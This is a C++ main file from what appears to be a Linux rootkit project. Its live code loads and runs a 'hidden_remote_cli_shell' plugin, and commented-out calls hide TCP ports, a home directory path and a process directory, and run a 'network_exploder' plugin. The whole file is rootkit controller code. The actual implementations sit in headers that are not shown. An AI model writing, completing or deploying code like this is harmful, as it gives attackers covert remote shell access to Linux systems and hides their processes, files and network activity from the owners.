//
// Created by idan on 1/1/24.
//

#include "main.h"
#include "linux_rootkit.h"
#include <iostream>

#include "cli_shell_access//cli_shell_access.h"
#include "process_access/process_access.h"
#include "hider/hider.h"

#include "plugins/hidden_remote_cli_shell/hidden_remote_cli_shell.h"
#include "plugins/network_exploder/network_exploder.h"

void execute() {
    linux_rootkit rootkit;

    std::cout << "test rootkit controller\n";

    id_value id = rootkit.load_plugin(std::make_unique<hidden_remote_cli_shell>());
    rootkit.run_plugin(id, false);

//    rootkit.load_plugin(std::make_unique<network_exploder>(rootkit.get_network_access()));
//    id_value remote_cli_id = rootkit.load_plugin(std::make_unique<remote_cli_shell_controller>(rootkit.get_network_access()));

//    rootkit.run_all();
//    rootkit.run_all_type_plugins<network_exploder>(false);


//    hide_tcp4_port(1234);
//    hide_tcp6_port(63342);
//    hide_absolute_path("/home/idan/Downloads");
//    hide_process_dir(1234);

//    reports_test();

//    while (true) {
//    }
}


int main() {
    execute();
}